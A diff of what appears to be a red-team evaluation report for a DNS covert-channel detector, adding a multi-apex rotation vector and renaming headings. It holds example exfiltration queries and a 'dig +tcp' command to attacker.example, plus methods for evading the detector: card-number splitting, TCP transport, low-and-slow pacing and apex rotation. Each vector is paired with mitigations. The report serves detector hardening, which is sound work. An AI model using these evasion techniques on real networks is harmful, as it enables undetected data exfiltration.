@@ -8,14 +8,15 @@ Evaluation of evasion vectors against the passive DNS covert channel detector (`
 
 - [Evasion & Hardening Matrix](#evasion--hardening-matrix)
 - [Section I: Algorithmic Vulnerabilities & Patches](#section-i-algorithmic-vulnerabilities--patches)
-  * [Vector 1: Entropy Dilution (Subdomain Padding)](#vector-1-entropy-dilution-subdomain-padding)
-  * [Vector 2: Multi-label Fragmentation (Label Slicing)](#vector-2-multi-label-fragmentation-label-slicing)
+  - [Vector 1: Entropy Dilution](#vector-1-entropy-dilution)
+  - [Vector 2: Multi-Label Slicing](#vector-2-multi-label-slicing)
 - [Section II: Theoretical & Mathematical Bounds](#section-ii-theoretical--mathematical-bounds)
-  * [Vector 3: Micro-chunking & Shannon Upper Bound](#vector-3-micro-chunking--shannon-upper-bound)
+  - [Vector 3: Micro-Chunking](#vector-3-micro-chunking)
 - [Section III: Architectural Limits & Operational Trade-offs](#section-iii-architectural-limits--operational-trade-offs)
-  * [Vector 4: Multi-Query Secret Splitting](#vector-4-multi-query-secret-splitting)
-  * [Vector 5: Transport Layer Evasion (DNS over TCP/53)](#vector-5-transport-layer-evasion-dns-over-tcp53)
-  * [Vector 6: Low-and-Slow Volumetric Beaconing](#vector-6-low-and-slow-volumetric-beaconing)
+  - [Vector 4: Multi-Query Splitting](#vector-4-multi-query-splitting)
+  - [Vector 5: DNS over TCP/53](#vector-5-dns-over-tcp53)
+  - [Vector 6: Low-and-Slow Beaconing](#vector-6-low-and-slow-beaconing)
+  - [Vector 7: Multi-Apex Rotation](#vector-7-multi-apex-rotation)
 
 
 
@@ -29,12 +30,12 @@ Evaluation of evasion vectors against the passive DNS covert channel detector (`
 | **4** | **Multi-Query Splitting** | Splitting card numbers across sequential queries to evade regex and Luhn checks | Architectural Limit | *Documented Limitation* |
 | **5** | **DNS over TCP/53** | Forcing TCP transport to bypass Scapy's UDP BPF filter | Architectural Limit | *Documented Limitation* |
 | **6** | **Low-and-Slow Beaconing** | Sending 1 query every 10–15s to evade the 60-second sliding volume window | Operational Trade-off | *Documented Limitation* |
-
+| **7** | **Multi-Apex Rotation** | Spreading query chunks across distinct apex domains to evade volume aggregation (`DNS_TUNNEL_VOLUME`) | Architectural Limit | *Documented Limitation* |
 
 
 ## Section I: Algorithmic Vulnerabilities & Patches
 
-### Vector 1: Entropy Dilution (Subdomain Padding)
+### Vector 1: Entropy Dilution
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -113,7 +114,7 @@ dlp-covert-detector  | │          qtype=A   entropy=4.0   payload_len=80      
 dlp-covert-detector  | ╰──────────────────────────────────────────────────────────────────────────────╯
 ```
 
-### Vector 2: Multi-label Fragmentation (Label Slicing)
+### Vector 2: Multi-label Slicing
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -190,7 +191,7 @@ dlp-covert-detector  | ╰──────────────────
 
 ## Section II: Theoretical & Mathematical Bounds
 
-### Vector 3: Micro-chunking & Shannon Upper Bound
+### Vector 3: Micro-chunking
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -254,7 +255,7 @@ Stateless per-packet entropy cannot catch micro-chunks. Alternative defenses inc
 
 ## Section III: Architectural Limits & Operational Trade-offs
 
-### Vector 4: Multi-Query Secret Splitting
+### Vector 4: Multi-Query Splitting
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -269,7 +270,7 @@ Query 2: c1.11111111.attacker.example
 
 Each packet carries only 8 digits, avoiding the 13-digit minimum needed to run the Luhn check.
 
-#### 2. Root Cause
+#### 2. Root Cause Analysis
 
 `dns_detector.py` evaluates packets statelessly:
 
@@ -322,7 +323,7 @@ No alerts triggered:
 - **Recursive DNS Resolvers:** Forward all client DNS through a managed resolver (Unbound, BIND) with query logging and RPZ filtering.
 - **Sliding Digit Buffer:** Keep a short sliding buffer of numbers received per client IP (e.g. over 10 seconds) and run the Luhn check on the concatenated string.
 
-### Vector 5: Transport Layer Evasion (DNS over TCP/53)
+### Vector 5: DNS over TCP/53
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -336,7 +337,7 @@ dig +tcp @172.21.0.10 exfiltration-payload.attacker.example
 
 This bypasses the sniffer completely.
 
-#### 2. Root Cause
+#### 2. Root Cause Analysis
 
 `sniffer.py` configures Scapy with a BPF filter:
 
@@ -394,7 +395,7 @@ The sniffer logs remain completely empty (0 packets captured).
 - **Egress Firewall Rules:** Block direct outbound UDP/53 and TCP/53 from workload subnets, forcing traffic through internal recursive resolvers.
 - **Full DPI Engine:** Use an engine with native TCP reassembly (Suricata, Zeek) if inspecting raw traffic taps.
 
-### Vector 6: Low-and-Slow Volumetric Beaconing
+### Vector 6: Low-and-Slow Beaconing
 
 #### 1. Threat Model & Evasion Mechanism
 
@@ -406,7 +407,7 @@ To evade this, an attacker paces requests so earlier queries expire from the rol
 
 With a 60-second window and an 8-query trigger, sending one query every 10 to 15 seconds ensures only 4 to 6 active entries ever reside in memory at once, exfiltrating data without raising an alert.
 
-#### 2. Root Cause & Trade-offs
+#### 2. Root Cause Analysis
 
 Volume tracking uses an in-memory sliding window keyed by `(source_ip, apex)`:
 
@@ -469,7 +470,7 @@ With 10-second intervals, the sniffer logs individual packets but raises no volu
 
 ```text
 dlp-covert-detector  | [DEBUG-SNIFFER] Packet intercepted : 172.20.0.3 -> 172.21.0.10
-(10 packets intercepted over 90 seconds — 0 alerts)
+(10 packets intercepted over 90 seconds - 0 alerts)
 ```
 
 At no point does the rolling 60-second window hold more than 6 queries.
@@ -481,3 +482,36 @@ Short-window packet sniffers cannot catch low-and-slow channels without high fal
 - **Log Analytics (SIEM):** Aggregate DNS logs over multi-hour or multi-day windows.
 - **Periodicity Detection:** Analyze query interval patterns using autocorrelation to detect automated beaconing even with slight jitter.
 - **Domain Reputation:** Correlate lookups with Newly Observed Domain (NOD) feeds to flag traffic toward recently registered apex domains.
+
+### Vector 7: Multi-Apex Rotation
+
+#### 1. Threat Model & Evasion Mechanism
+
+The volumetric detection engine (`DNS_TUNNEL_VOLUME`) aggregates queries using the composite key `(source_ip, apex)`.
+
+An attacker possessing multiple registered apex domains (or utilizing cheap, burner TLDs) can rotate the destination apex across sequential exfiltration queries:
+
+```text
+Query 1: c0.7b4a9f2e.domain-alpha.com
+Query 2: c1.1c0d3a5b.domain-bravo.net
+Query 3: c2.8f2d1e4c.domain-charlie.org
+```
+
+Because each query targets a distinct apex, a separate sliding-window state is initialized for each domain. Even during high-frequency bursts (D3), each tracked flow only records 1 request within the 60-second window, evading the threshold of 8 unique subdomains entirely.
+
+#### 2. Root Cause Analysis
+
+The detector relies on grouping queries by apex to distinguish concentrated covert tunnels from typical user browsing:
+
+Attempting to mitigate this within a local passive sniffer faces strict trade-offs:
+
+- **Global Source Tracking:** Aggregating queries solely by `source_ip` without apex discrimination triggers severe false positive spikes; modern web page loads routinely resolve dozens of distinct apex domains (CDNs, analytics, ad networks) in under 5 seconds.
+- **Resource Exhaustion:** Tracking volume across arbitrary combinations of unknown domains increases in-memory state complexity and leaves the sniffer vulnerable to exhaustion attacks.
+
+Addressing multi-apex evasion requires contextual reputation metrics not available at the raw packet-sniffing layer, placing this vector **out of scope** for our current stateless sniffer.
+
+#### 3. Mitigations
+
+- **Newly Observed Domains (NOD) feeds:** Use threat feeds on the internal resolver to block or alert on queries targeting domains registered only a few days ago.
+- **Shared nameserver correlation:** In the SIEM, look for multiple distinct domains resolving through the exact same authoritative nameserver IP.
+- **Forced internal resolution:** Block direct outbound DNS (UDP/TCP 53) at the firewall, forcing hosts to query internal managed resolvers equipped with specific blocking rules.
